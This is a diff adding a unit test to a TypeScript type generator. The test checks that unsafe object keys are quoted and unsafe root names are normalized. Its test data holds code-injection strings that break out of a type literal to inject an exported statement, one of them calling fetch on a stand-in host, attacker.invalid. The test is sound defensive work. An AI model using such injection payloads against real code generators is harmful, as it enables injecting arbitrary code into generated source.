@@ -105,4 +105,19 @@ describe('generateExtractedTypes', () => {
     expect(result).toContain('type Root =');
     expect(result).toContain('type User =');
   });
+  it('quotes unsafe keys and normalizes unsafe root names', () => {
+    const key = 'x\n}\nexport const pwn = fetch("https://attacker.invalid"); //';
+    const inline = generateType({ [key]: 1 }, { arraySyntax: 'shorthand', indent: 2 });
+    expect(inline).toContain(`${JSON.stringify(key)}: number;`);
+    expect(inline).not.toContain('\n}\nexport const pwn');
+
+    const extracted = generateExtractedTypes({ safe: 1 }, {
+      typeConstruct: 'interface',
+      rootName: 'Root\nexport const pwn = 1',
+      arraySyntax: 'shorthand',
+      indent: 2,
+    });
+    expect(extracted).toContain('interface Root {');
+    expect(extracted).not.toContain('export const pwn');
+  });
 });
